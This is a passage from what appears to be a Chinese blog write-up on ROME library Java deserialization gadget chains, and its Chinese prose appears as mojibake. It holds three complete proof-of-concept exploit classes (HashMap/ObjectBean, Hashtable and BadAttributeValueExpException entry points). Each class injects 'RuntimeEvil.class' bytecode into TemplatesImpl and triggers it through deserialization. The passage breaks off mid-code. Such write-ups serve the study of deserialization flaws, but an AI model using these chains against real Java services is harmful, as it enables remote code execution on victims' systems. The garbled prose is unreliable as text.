srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getPDsè°ƒç”¨getMethods()è·å–äº†ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œå†è°ƒç”¨å¦ä¸€ä¸ªåŒå‚æ•°çš„getPDsåˆ†åˆ«è·å–getterå’Œsetteræ–¹æ³•ã€‚æŠŠä¸€ä¸ªå­—æ®µå¯¹åº”çš„getterå’Œsetteråˆå¹¶åˆ°ä¸€ä¸ªListã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153642631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153642631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†å›åˆ°toStringï¼Œå¾ªç¯getPropertyDescriptorsè¯»åˆ°çš„getter,setterç»„åˆï¼Œç”¨getReadMethodå–å‡ºgetteræ–¹æ³•ã€‚<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923154059131.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923154059131.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœè¿™ä¸ªå­—æ®µçš„getteræ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p><ul><li>ä¸ä¸ºç©ºï¼ˆå­—æ®µæœ‰å¯¹åº”çš„getteræ–¹æ³•ï¼‰</li><li>è¿™ä¸ªgetterä¸æ˜¯Object.classçš„æ–¹æ³•ï¼ˆgetDeclaringClassè·å–æˆå‘˜æ‰€åœ¨çš„ç±»ï¼‰</li><li>æ— å‚</li></ul><p>å¦‚æœæ»¡è¶³ï¼Œå°±è°ƒç”¨è¿™ä¸ªgetter</p><h4 id="å›å¿†åœ¨æ”»å‡»æˆ‘"><a href="#å›å¿†åœ¨æ”»å‡»æˆ‘" class="headerlink" title="å›å¿†åœ¨æ”»å‡»æˆ‘"></a>å›å¿†åœ¨æ”»å‡»æˆ‘</h4><p>æˆ‘çŒ›åœ°ä¸€ä¸‹æƒ³èµ·æ‰“shiro CBä¾èµ–çš„è¿‡ç¨‹</p><p>PropertyUtils.getPropertyè§¦å‘TemplatesImpl.getOutputProperties</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923160255473.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923160255473.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›è€Œè§¦å‘newTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923160431753.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923160431753.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="com-sun-syndication-feed-impl-EqualsBean-beanEquals"><a href="#com-sun-syndication-feed-impl-EqualsBean-beanEquals" class="headerlink" title="com.sun.syndication.feed.impl.EqualsBean#beanEquals"></a>com.sun.syndication.feed.impl.EqualsBean#beanEquals</h3><p>è¿™æ˜¯ROMEä¾èµ–ç¬¬äºŒä¸ªæ¼æ´è§¦å‘ç‚¹</p><p>_objå’Œå‚æ•°objéƒ½ä¸ä¸ºç©ºï¼Œä¸”_beanClasså’Œobjç±»å‹ç›¸åŒæ—¶ï¼Œè¿›å…¥tryå—</p><p>å’ŒToStringBean#toStringä¸€æ ·çš„æµç¨‹ï¼ŒåŒæ—¶æ‰§è¡Œäº†_objå’Œobjçš„getteræ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923161620805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923161620805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>OKï¼Œç›´æ¥å¼€å§‹æ„é€ é“¾å§ï¼Œæ‡’å¾—æˆªå›¾åˆ†æäº†</p><h2 id="ROMEååºåˆ—åŒ–é“¾"><a href="#ROMEååºåˆ—åŒ–é“¾" class="headerlink" title="ROMEååºåˆ—åŒ–é“¾"></a>ROMEååºåˆ—åŒ–é“¾</h2><h3 id="ObjectBeané“¾"><a href="#ObjectBeané“¾" class="headerlink" title="ObjectBeané“¾"></a>ObjectBeané“¾</h3><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">EqualsBean.hashCode()                  </span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment">//HashMap&lt;K,V&gt;.hash(Object)</span></span><br><span class="line"><span class="comment">//ObjectBean.hashCode()</span></span><br><span class="line"><span class="comment">//EqualsBean.hashCode()</span></span><br><span class="line"><span class="comment">//EqualsBean.beanHashCode()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, fakeTemplates);<span class="comment">//é˜²æ­¢æå‰è§¦å‘</span></span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"><span class="comment">//        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">toStringBean_objField</span> <span class="operator">=</span> ToStringBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        toStringBean_objField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        toStringBean_objField.set(toStringBean, templatesClass);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTableé“¾"><a href="#HashTableé“¾" class="headerlink" title="HashTableé“¾"></a>HashTableé“¾</h3><p>é€‚ç”¨äºHashMapè¢«bançš„æƒ…å†µ</p><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject(ObjectInputStream)</span><br><span class="line">HashTable.reconstitutionPut()              </span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">EqualsBean.hashCode()                  </span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>HashTable.readObjectä¼šå¯¹æ¯ä¸ªé”®å€¼å¯¹è°ƒç”¨reconstitutionPut</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923194707731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923194707731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HashTable.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment">//HashTable.reconstitutionPut()</span></span><br><span class="line"><span class="comment">//ObjectBean.hashCode()</span></span><br><span class="line"><span class="comment">//EqualsBean.hashCode()</span></span><br><span class="line"><span class="comment">//EqualsBean.beanHashCode()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_HashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, fakeTemplates);<span class="comment">//é˜²æ­¢æå‰è§¦å‘</span></span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"><span class="comment">//        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">toStringBean_objField</span> <span class="operator">=</span> ToStringBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        toStringBean_objField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        toStringBean_objField.set(toStringBean, templatesClass);</span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>CC5å…¥å£</p><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">Byte.toString()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ„é€ å‡½æ•°çš„ä¸‰å…ƒè¡¨è¾¾å¼æ„æ€ä¸ºï¼šå°†è¾“å…¥å‚æ•° val è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶èµ‹å€¼ç»™ this.valã€‚è‹¥ val ä¸º nullï¼Œåˆ™ this.val ä¹Ÿè®¾ä¸º nullã€‚æ‰€ä»¥è¿™é‡Œä¸èƒ½ä¼ ToStringBeanã€‚ä¼ äº†çš„è¯valå€¼ä¸ºToStringBean.toString()ï¼Œç„¶åé“¾å¼è§¦å‘åˆ°æŠ¥é”™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923201726557.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923201726557.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>èµ°åˆ°readObjectçš„else ifï¼Œå› ä¸ºæ²¡è®¾ç½®å®‰å…¨ç®¡ç†å™¨è§¦å‘toString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923202421247.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923202421247.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="comment">//BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_BadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesClass);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);<span class="comment">//é˜²æ­¢æå‰è§¦å‘</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, toStringBean);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        